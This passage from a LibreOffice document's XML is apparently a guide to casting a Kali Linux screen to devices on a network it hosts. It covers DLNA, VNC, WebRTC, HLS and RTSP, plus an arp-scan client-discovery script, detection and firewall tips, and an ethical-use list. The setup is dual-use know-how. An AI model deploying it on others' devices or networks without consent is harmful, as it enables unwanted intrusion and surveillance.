      <text:p text:style-name="Text_20_body">Add configuration:</text:p>
      <text:p text:style-name="P44">media_dir=V,/home/kali/Videos<text:line-break/>media_dir=P,/home/kali/Pictures<text:line-break/>friendly_name=Kali Cast Server<text:line-break/>model_name=Windows Media Connect Compatible<text:line-break/>inotify=yes<text:line-break/>enable_subtitles=yes</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">**Step 2: Start DLNA Server</text:h>
      <text:p text:style-name="P44"># Start service<text:line-break/>sudo systemctl start minidlna<text:line-break/><text:line-break/># Check status<text:line-break/>sudo systemctl status minidlna<text:line-break/><text:line-break/># Force rescan<text:line-break/>sudo service minidlna force-reload</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 3: Stream Live Screen as DLNA Content</text:span></text:h>
      <text:p text:style-name="P44"># Capture screen and encode as MP4<text:line-break/>ffmpeg -f x11grab -framerate 30 -video_size 1920x1080 \<text:line-break/> <text:s text:c="3"/>-i :0.0 -c:v libx264 -preset ultrafast \<text:line-break/> <text:s text:c="3"/>-f mp4 /home/kali/Videos/live_screen.mp4 -re<text:line-break/><text:line-break/># The file will be immediately available via DLNA<text:line-break/># Client devices can browse to "Kali Cast Server" and play "live_screen.mp4"</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">How it works</text:span>: DLNA uses UPnP for discovery and HTTP for media transfer, creating a shared media library.</text:p>
      <text:p text:style-name="Horizontal_20_Line"><text:soft-page-break/></text:p>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">METHOD 4: VNC/REMOTE DESKTOP</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 1: Set Up VNC Server</text:span></text:h>
      <text:p text:style-name="P44"># Install x11vnc<text:line-break/>sudo apt install x11vnc<text:line-break/><text:line-break/># Set VNC password<text:line-break/>x11vnc -storepasswd<text:line-break/># Enter password, saves to ~/.vnc/passwd<text:line-break/><text:line-break/># Start VNC server<text:line-break/>x11vnc -forever -usepw -display :0 -shared -rfbauth ~/.vnc/passwd &amp;</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 2: Make VNC Accessible via Web</text:span></text:h>
      <text:p text:style-name="P44"># Install noVNC (HTML5 VNC client)<text:line-break/>git clone https://github.com/novnc/noVNC.git<text:line-break/>cd noVNC<text:line-break/><text:line-break/># Create self-signed certificate<text:line-break/>openssl req -new -x509 -days 365 -nodes \<text:line-break/> <text:s text:c="3"/>-out self.pem -keyout self.pem<text:line-break/><text:line-break/># Start noVNC proxy<text:line-break/>./utils/novnc_proxy --vnc localhost:5900 --cert self.pem</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 3: Client Connection</text:span></text:h>
      <text:p text:style-name="P44"># Clients can connect via:<text:line-break/># 1. Direct VNC: vnc://192.168.1.1:5900<text:line-break/># 2. Web browser: https://192.168.1.1:6080/vnc.html<text:line-break/><text:line-break/># For Android clients:<text:line-break/># Install "VNC Viewer" app<text:line-break/># Connect to: 192.168.1.1:5900</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">How it works</text:span>: VNC captures X11 display framebuffer, compresses it, and streams over RFB protocol.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">METHOD 5: WEBRTC/LIVE STREAMING</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 1: Set Up WebRTC Server</text:span></text:h>
      <text:p text:style-name="P44"># Install Node.js and dependencies<text:line-break/>sudo apt install nodejs npm<text:line-break/>npm install express socket.io webrtc-streamer<text:line-break/><text:line-break/># Create server.js<text:line-break/><text:soft-page-break/>cat &gt; server.js &lt;&lt; 'EOF'<text:line-break/>const express = require('express');<text:line-break/>const app = express();<text:line-break/>const http = require('http').createServer(app);<text:line-break/>const io = require('socket.io')(http);<text:line-break/><text:line-break/>app.use(express.static('public'));<text:line-break/><text:line-break/>app.get('/', (req, res) =&gt; {<text:line-break/> <text:s text:c="3"/>res.sendFile(__dirname + '/index.html');<text:line-break/>});<text:line-break/><text:line-break/>io.on('connection', (socket) =&gt; {<text:line-break/> <text:s text:c="3"/>console.log('Client connected');<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>socket.on('offer', (data) =&gt; {<text:line-break/> <text:s text:c="7"/>socket.broadcast.emit('offer', data);<text:line-break/> <text:s text:c="3"/>});<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>socket.on('answer', (data) =&gt; {<text:line-break/> <text:s text:c="7"/>socket.broadcast.emit('answer', data);<text:line-break/> <text:s text:c="3"/>});<text:line-break/> <text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>socket.on('candidate', (data) =&gt; {<text:line-break/> <text:s text:c="7"/>socket.broadcast.emit('candidate', data);<text:line-break/> <text:s text:c="3"/>});<text:line-break/>});<text:line-break/><text:line-break/>http.listen(3000, () =&gt; {<text:line-break/> <text:s text:c="3"/>console.log('WebRTC server on port 3000');<text:line-break/>});<text:line-break/>EOF</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 2: Create HTML Client</text:span></text:h>
      <text:p text:style-name="P44">mkdir public<text:line-break/>cat &gt; public/index.html &lt;&lt; 'EOF'<text:line-break/>&lt;!DOCTYPE html&gt;<text:line-break/>&lt;html&gt;<text:line-break/>&lt;head&gt;<text:line-break/> <text:s text:c="3"/>&lt;title&gt;Kali Screen Cast&lt;/title&gt;<text:line-break/> <text:s text:c="3"/>&lt;script src="/socket.io/socket.io.js"&gt;&lt;/script&gt;<text:line-break/>&lt;/head&gt;<text:line-break/>&lt;body&gt;<text:line-break/> <text:s text:c="3"/>&lt;video id="remoteVideo" autoplay playsinline&gt;&lt;/video&gt;<text:line-break/> <text:s text:c="3"/>&lt;script&gt;<text:line-break/> <text:s text:c="7"/>const socket = io();<text:line-break/> <text:s text:c="7"/>const video = document.getElementById('remoteVideo');<text:line-break/> <text:s text:c="7"/>let pc = new RTCPeerConnection();<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>pc.ontrack = (event) =&gt; {<text:line-break/> <text:s text:c="11"/>video.srcObject = event.streams[0];<text:line-break/> <text:s text:c="7"/>};<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>socket.on('offer', async (offer) =&gt; {<text:line-break/> <text:s text:c="11"/>await pc.setRemoteDescription(new RTCSessionDescription(offer));<text:line-break/> <text:s text:c="11"/>const answer = await pc.createAnswer();<text:line-break/> <text:s text:c="11"/>await pc.setLocalDescription(answer);<text:line-break/><text:soft-page-break/> <text:s text:c="11"/>socket.emit('answer', answer);<text:line-break/> <text:s text:c="7"/>});<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>socket.on('answer', (answer) =&gt; {<text:line-break/> <text:s text:c="11"/>pc.setRemoteDescription(new RTCSessionDescription(answer));<text:line-break/> <text:s text:c="7"/>});<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>socket.on('candidate', (candidate) =&gt; {<text:line-break/> <text:s text:c="11"/>pc.addIceCandidate(new RTCIceCandidate(candidate));<text:line-break/> <text:s text:c="7"/>});<text:line-break/> <text:s text:c="3"/>&lt;/script&gt;<text:line-break/>&lt;/body&gt;<text:line-break/>&lt;/html&gt;<text:line-break/>EOF</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 3: Capture and Stream Screen</text:span></text:h>
      <text:p text:style-name="P44"># Using ffmpeg to WebRTC (simplified)<text:line-break/>ffmpeg -f x11grab -s 1920x1080 -r 30 -i :0.0 \<text:line-break/> <text:s text:c="3"/>-vcodec libvpx -cpu-used 5 -deadline 1 \<text:line-break/> <text:s text:c="3"/>-f webm - | node stream_to_webrtc.js</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">How it works</text:span>: WebRTC establishes peer-to-peer connection using STUN/TURN servers, streams VP8/VP9/H.264 video.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">METHOD 6: SIMPLE HTTP LIVE STREAMING (HLS)</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 1: Set Up HLS Server</text:span></text:h>
      <text:p text:style-name="P44"># Install nginx with HLS module<text:line-break/>sudo apt install nginx libnginx-mod-rtmp<text:line-break/><text:line-break/># Configure nginx<text:line-break/>sudo nano /etc/nginx/nginx.conf</text:p>
      <text:p text:style-name="Text_20_body">Add RTMP configuration:</text:p>
      <text:p text:style-name="P44">rtmp {<text:line-break/> <text:s text:c="3"/>server {<text:line-break/> <text:s text:c="7"/>listen 1935;<text:line-break/> <text:s text:c="7"/>chunk_size 4096;<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>application live {<text:line-break/> <text:s text:c="11"/>live on;<text:line-break/> <text:s text:c="11"/>record off;<text:line-break/> <text:s text:c="11"/>hls on;<text:line-break/> <text:s text:c="11"/>hls_path /tmp/hls;<text:line-break/> <text:s text:c="11"/>hls_fragment 3;<text:line-break/> <text:s text:c="11"/>hls_playlist_length 60;<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="3"/>}<text:line-break/>}<text:line-break/><text:line-break/><text:soft-page-break/>http {<text:line-break/> <text:s text:c="3"/>server {<text:line-break/> <text:s text:c="7"/>listen 8080;<text:line-break/> <text:s text:c="7"/><text:line-break/> <text:s text:c="7"/>location /hls {<text:line-break/> <text:s text:c="11"/>types {<text:line-break/> <text:s text:c="15"/>application/vnd.apple.mpegurl m3u8;<text:line-break/> <text:s text:c="15"/>video/mp2t ts;<text:line-break/> <text:s text:c="11"/>}<text:line-break/> <text:s text:c="11"/>root /tmp;<text:line-break/> <text:s text:c="11"/>add_header Cache-Control no-cache;<text:line-break/> <text:s text:c="11"/>add_header Access-Control-Allow-Origin *;<text:line-break/> <text:s text:c="7"/>}<text:line-break/> <text:s text:c="3"/>}<text:line-break/>}</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 2: Stream Screen to HLS</text:span></text:h>
      <text:p text:style-name="P44"># Start nginx<text:line-break/>sudo systemctl restart nginx<text:line-break/><text:line-break/># Stream screen to RTMP<text:line-break/>ffmpeg -f x11grab -s 1920x1080 -r 30 -i :0.0 \<text:line-break/> <text:s text:c="3"/>-c:v libx264 -preset ultrafast -tune zerolatency \<text:line-break/> <text:s text:c="3"/>-f flv rtmp://localhost/live/screen</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 3: Client Access</text:span></text:h>
      <text:p text:style-name="P44">&lt;!-- Client HTML page --&gt;<text:line-break/>&lt;video id="video" controls autoplay&gt;<text:line-break/> <text:s text:c="3"/>&lt;source src="http://192.168.1.1:8080/hls/screen.m3u8" type="application/x-mpegURL"&gt;<text:line-break/>&lt;/video&gt;</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">How it works</text:span>: HLS breaks stream into small .ts segments with .m3u8 playlist, allowing adaptive streaming.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">METHOD 7: RTSP STREAMING</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 1: Set Up RTSP Server</text:span></text:h>
      <text:p text:style-name="P44"># Install RTSP server<text:line-break/>sudo apt install vlc<text:line-break/># or use mediamtx (formerly rtsp-simple-server)<text:line-break/>wget https://github.com/bluenviron/mediamtx/releases/latest/download/mediamtx_linux_amd64.tar.gz<text:line-break/>tar -xzf mediamtx_linux_amd64.tar.gz<text:line-break/>./mediamtx &amp;</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/><text:span text:style-name="T12">Step 2: Stream Screen via RTSP</text:span></text:h>
      <text:p text:style-name="P44"># Using ffmpeg to RTSP<text:line-break/>ffmpeg -f x11grab -s 1920x1080 -r 30 -i :0.0 \<text:line-break/> <text:s text:c="3"/>-c:v libx264 -preset ultrafast -tune zerolatency \<text:line-break/> <text:s text:c="3"/>-f rtsp rtsp://localhost:8554/screen<text:line-break/><text:line-break/># Or using gstreamer<text:line-break/>gst-launch-1.0 ximagesrc ! videoconvert ! x264enc ! \<text:line-break/> <text:s text:c="3"/>rtspclientsink location=rtsp://localhost:8554/screen</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Step 3: Client Playback</text:span></text:h>
      <text:p text:style-name="P44"># Android: Install "IP Webcam" or "RTSP Player"<text:line-break/># iOS: Install "RTSP Camera"<text:line-break/># Windows: VLC media player<text:line-break/># VLC: Media → Open Network → rtsp://192.168.1.1:8554/screen</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">How it works</text:span>: RTSP establishes session control, RTP transports media, RTCP provides feedback.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">DETECTION &amp; PROTECTION METHODS</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">How to Detect Unwanted Casting:</text:span></text:h>
      <text:p text:style-name="P44"># On client device (if you have access):<text:line-break/># Check for unexpected connections<text:line-break/>netstat -tulpn | grep -E "5900|1935|8554|8000"<text:line-break/><text:line-break/># Monitor network for casting protocols<text:line-break/>sudo tcpdump -i wlan0 -n "port 554 or port 1935 or port 8009"<text:line-break/><text:line-break/># Check for mDNS advertisements<text:line-break/>avahi-browse -a -r</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Security Measures:</text:span></text:h>
      <text:p text:style-name="P44"># 1. Disable casting protocols on client<text:line-break/># Android: Settings → Connected devices → Connection preferences<text:line-break/># Disable: Cast, Wi-Fi Direct, DLNA<text:line-break/><text:line-break/># 2. Network segmentation<text:line-break/># Separate IoT devices from main network<text:line-break/><text:line-break/># 3. Monitor ARP tables<text:line-break/>arp -a <text:s/># Check for unexpected devices<text:line-break/><text:line-break/># 4. Use firewall rules<text:line-break/>sudo iptables -A INPUT -p tcp --dport 5900 -j DROP <text:s/># Block VNC<text:line-break/>sudo iptables -A INPUT -p tcp --dport 554 -j DROP <text:s text:c="2"/># Block RTSP</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:soft-page-break/><text:span text:style-name="T12">AUTOMATED CAST SCRIPT</text:span></text:h>
      <text:p text:style-name="P44">#!/bin/bash<text:line-break/># auto_cast.sh - Automatically cast screen to connected clients<text:line-break/><text:line-break/># Configuration<text:line-break/>AP_IP="192.168.1.1"<text:line-break/>SCREEN_RES="1920x1080"<text:line-break/>FPS=30<text:line-break/><text:line-break/># Detect connected clients<text:line-break/>clients=$(sudo arp-scan --interface=wlan0 --localnet | grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | awk '{print $1}')<text:line-break/><text:line-break/>echo "Found clients: $clients"<text:line-break/><text:line-break/># Method selection<text:line-break/>echo "Select casting method:"<text:line-break/>echo "1) HTTP Live Streaming (HLS)"<text:line-break/>echo "2) VNC Remote Desktop"<text:line-break/>echo "3) RTSP Stream"<text:line-break/>read -p "Choice [1-3]: " method<text:line-break/><text:line-break/>case $method in<text:line-break/> <text:s text:c="3"/>1)<text:line-break/> <text:s text:c="7"/># HLS Streaming<text:line-break/> <text:s text:c="7"/>echo "Starting HLS stream..."<text:line-break/> <text:s text:c="7"/>ffmpeg -f x11grab -s $SCREEN_RES -r $FPS -i :0.0 \<text:line-break/> <text:s text:c="11"/>-c:v libx264 -preset ultrafast -tune zerolatency \<text:line-break/> <text:s text:c="11"/>-f flv rtmp://$AP_IP/live/screen &amp;<text:line-break/> <text:s text:c="7"/>echo "Clients can access: http://$AP_IP:8080/hls/screen.m3u8"<text:line-break/> <text:s text:c="7"/>;;<text:line-break/> <text:s text:c="3"/>2)<text:line-break/> <text:s text:c="7"/># VNC<text:line-break/> <text:s text:c="7"/>echo "Starting VNC server..."<text:line-break/> <text:s text:c="7"/>x11vnc -forever -usepw -display :0 -shared -rfbauth ~/.vnc/passwd &amp;<text:line-break/> <text:s text:c="7"/>echo "Clients connect to: $AP_IP:5900"<text:line-break/> <text:s text:c="7"/>;;<text:line-break/> <text:s text:c="3"/>3)<text:line-break/> <text:s text:c="7"/># RTSP<text:line-break/> <text:s text:c="7"/>echo "Starting RTSP stream..."<text:line-break/> <text:s text:c="7"/>ffmpeg -f x11grab -s $SCREEN_RES -r $FPS -i :0.0 \<text:line-break/> <text:s text:c="11"/>-c:v libx264 -preset ultrafast -tune zerolatency \<text:line-break/> <text:s text:c="11"/>-f rtsp rtsp://$AP_IP:8554/screen &amp;<text:line-break/> <text:s text:c="7"/>echo "Clients connect to: rtsp://$AP_IP:8554/screen"<text:line-break/> <text:s text:c="7"/>;;<text:line-break/> <text:s text:c="3"/>*)<text:line-break/> <text:s text:c="7"/>echo "Invalid choice"<text:line-break/> <text:s text:c="7"/>;;<text:line-break/>esac<text:line-break/><text:line-break/>echo "Casting started. Press Ctrl+C to stop."<text:line-break/>wait</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:soft-page-break/><text:span text:style-name="T12">ETHICAL USE CASES ONLY</text:span></text:h>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="T12">Home entertainment system</text:span> - Cast movies to TV<text:line-break/>✅ <text:span text:style-name="T12">Business presentations</text:span> - Share screen in meetings<text:line-break/>✅ <text:span text:style-name="T12">Education</text:span> - Teacher casting to student devices<text:line-break/>✅ <text:span text:style-name="T12">Gaming</text:span> - Stream games to multiple screens<text:line-break/>✅ <text:span text:style-name="T12">Digital signage</text:span> - Display content on multiple monitors</text:p>
      <text:p text:style-name="Text_20_body">❌ <text:span text:style-name="T12">NEVER use to:</text:span></text:p>
      <text:list text:style-name="L46">
        <text:list-item>
          <text:p text:style-name="P96">Spy on others without consent</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P96">Project inappropriate content to public displays</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P96">Disrupt presentations or events</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P96">Bypass content protection</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P96">Conduct unauthorized surveillance</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:span text:style-name="T12">TROUBLESHOOTING</text:span></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T12">Common Issues:</text:span></text:h>
      <text:list text:style-name="L47">
        <text:list-item>
          <text:p text:style-name="P97"><text:span text:style-name="T12">No devices found</text:span>:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P44"># Ensure devices are on same network<text:line-break/>ping 192.168.1.100<text:line-break/><text:line-break/># Check firewall<text:line-break/>sudo iptables -L<text:line-break/><text:line-break/># Verify mDNS is working<text:line-break/>avahi-daemon --version</text:p>
      <text:list text:style-name="L48">
        <text:list-item>
          <text:p text:style-name="P98"><text:span text:style-name="T12">Poor video quality</text:span>:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P44"># Reduce resolution<text:line-break/>ffmpeg -f x11grab -s 1280x720 -r 25 -i :0.0 ...<text:line-break/><text:line-break/># Increase bitrate<text:line-break/>ffmpeg ... -b:v 2000k ...<text:line-break/><text:line-break/># Use hardware acceleration (if available)<text:line-break/>ffmpeg -vaapi_device /dev/dri/renderD128 -f x11grab ...</text:p>
      <text:list text:style-name="L49">
        <text:list-item>
          <text:p text:style-name="P99"><text:span text:style-name="T12">High latency</text:span>:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P44"># Use zerolatency preset<text:line-break/>-preset ultrafast -tune zerolatency<text:line-break/><text:line-break/># Reduce GOP size<text:line-break/><text:soft-page-break/>-g 30<text:line-break/><text:line-break/># Use TCP instead of UDP (more reliable)<text:line-break/>ffmpeg ... -f rtsp -rtsp_transport tcp ...</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Remember</text:span>: Always obtain explicit permission before casting to any device. Respect privacy and follow all applicable laws and regulations.</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cmr10" svg:font-family="cmr10"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6-26T17:36:20.253711392</dc:date>
    <meta:editing-duration>PT5H28M28S</meta:editing-duration>
    <meta:editing-cycles>7</meta:editing-cycles>
    <meta:generator>LibreOffice/26.2.2.2$Linux_X86_64 LibreOffice_project/620$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="10" meta:image-count="0" meta:object-count="0" meta:page-count="128" meta:paragraph-count="4427" meta:word-count="31268" meta:character-count="250983" meta:non-whitespace-character-count="199363"/>
  </office:meta>
</office:document-meta>
</file>